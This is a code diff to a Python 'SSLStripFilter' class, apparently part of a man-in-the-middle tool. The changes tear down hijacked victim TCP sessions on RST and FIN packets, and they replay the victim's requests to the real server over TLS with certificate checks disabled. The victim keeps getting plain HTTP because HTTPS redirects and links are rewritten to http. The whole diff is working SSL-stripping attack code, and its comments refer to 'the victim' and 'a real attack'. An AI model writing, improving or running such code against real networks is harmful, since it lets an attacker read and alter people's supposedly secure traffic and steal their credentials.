@@ -58,15 +58,32 @@ class SSLStripFilter:
             self.send_syn_ack(packet)
             return True # Packet handled, do not forward
 
-        # 2. Handle Data / ACK
+        # 2. Handle RST / FIN / Data / ACK
+        
+        # Check RST (Reset)
+        if tcp.flags & 0x04:
+             self.handle_rst(victim_port)
+             return True
+
         if victim_port in self.sessions:
             session = self.sessions[victim_port]
             
-            # Update ACK from victim (they are acking our data)
+            # Update ACK from victim
             session['victim_ack'] = tcp.ack
 
-            # If PSH or FIN, handle data
-            if tcp.flags & 0x18 or len(tcp.payload) > 0: # PSH or FIN or just data
+            # Check FIN (Finish)
+            if tcp.flags & 0x01:
+                 # Check if there is data payload with the FIN
+                 payload = bytes(tcp.payload)
+                 if payload:
+                      session['victim_seq'] += len(payload)
+                      self.handle_http_request(session, payload, packet)
+                 
+                 self.handle_fin(packet, victim_port)
+                 return True
+
+            # If PSH or just data
+            if tcp.flags & 0x18 or len(tcp.payload) > 0: # PSH or ACK handling data
                 payload = bytes(tcp.payload)
                 if payload:
                     # Update expected seq from victim
@@ -118,6 +135,10 @@ class SSLStripFilter:
         try:
             # Rewrite headers to prevent compression (so we can replace text easily)
             payload = payload.replace(b"Accept-Encoding: gzip", b"Accept-Encoding: identity")
+            
+            # Save payload in case we need to replay it after an SSL upgrade
+            session['last_request_payload'] = payload
+            
             session['server_sock'].sendall(payload)
         except Exception as e:
             self.logger(f"[SSLStrip] Failed to send to server: {e}")
@@ -132,13 +153,42 @@ class SSLStripFilter:
                 # --- SSL STRIP LOGIC ---
                 
                 # 1. Intercept Redirects to HTTPS
-                if b"Location: https://" in data:
-                    self.logger("[SSLStrip] Detected HTTPS Redirect! Stripping...")
-                    data = data.replace(b"Location: https://", b"Location: http://")
+                # If the server tries to redirect us to HTTPS, we intercept it.
+                # Instead of telling the user to switch, WE switch to SSL, replay the request, and return the secure content as HTTP.
+                if b"Location: https://" in data and not session['ssl']:
+                    self.logger("[SSLStrip] Detected HTTPS Redirect! Upgrading connection to SSL...")
                     
-                    # In a real attack, we would now upgrade 'sock' to SSL for future requests
-                    # But for this flow, we just strip the redirect so the user stays on HTTP.
-                    # The next request from user will come to port 80, and we will proxy again.
+                    try:
+                        # 1. Connect to SSL Port (443)
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        
+                        raw_sock = socket.create_connection((session['server_ip'], 443))
+                        ssl_sock = context.wrap_socket(raw_sock, server_hostname=session['server_ip'])
+                        
+                        # 2. Swap the socket in the session
+                        old_sock = session['server_sock']
+                        session['server_sock'] = ssl_sock
+                        session['ssl'] = True
+                        sock = ssl_sock # Update local variable for this loop
+                        
+                        # 3. Replay the original request over the encrypted channel
+                        if 'last_request_payload' in session:
+                            self.logger("[SSLStrip] Replaying request over SSL...")
+                            sock.sendall(session['last_request_payload'])
+                            
+                            # Close the old plain socket
+                            old_sock.close()
+                            
+                            # Continue the loop to read the NEW response (from the SSL socket)
+                            # We discard the current 'data' which contained the 301 Redirect
+                            continue
+                    except Exception as e:
+                        self.logger(f"[SSLStrip] SSL Upgrade Failed: {e}")
+                        # Fallback: Just strip the link and hope for the best (standard behavior)
+                        data = data.replace(b"Location: https://", b"Location: http://")
+
 
                 # 2. Rewrite Body Links (https:// -> http://)
                 # This is a naive replacement, but works for PoC
@@ -169,3 +219,35 @@ class SSLStripFilter:
               
         sc.send(pkt, verbose=0)
         session['my_seq'] += len(data)
+
+    def handle_rst(self, victim_port):
+        if victim_port in self.sessions:
+            self.logger(f"[SSLStrip] Connection reset by victim {self.victim_ip}:{victim_port}")
+            session = self.sessions[victim_port]
+            if session['server_sock']:
+                try:
+                    session['server_sock'].close()
+                except:
+                    pass
+            del self.sessions[victim_port]
+
+    def handle_fin(self, packet, victim_port):
+        if victim_port in self.sessions:
+            self.logger(f"[SSLStrip] Connection finished by victim {self.victim_ip}:{victim_port}")
+            session = self.sessions[victim_port]
+            
+            # Acknowledge the FIN (FIN consumes 1 sequence number)
+            # If payload was also processed in handle_client_packet, victim_seq is already updated for payload.
+            # We add 1 for the FIN flag.
+            session['victim_seq'] += 1
+            
+            self.send_ack(packet, session)
+            
+            # Close server connection
+            if session['server_sock']:
+                try:
+                    session['server_sock'].close()
+                except:
+                    pass
+            
+            del self.sessions[victim_port]
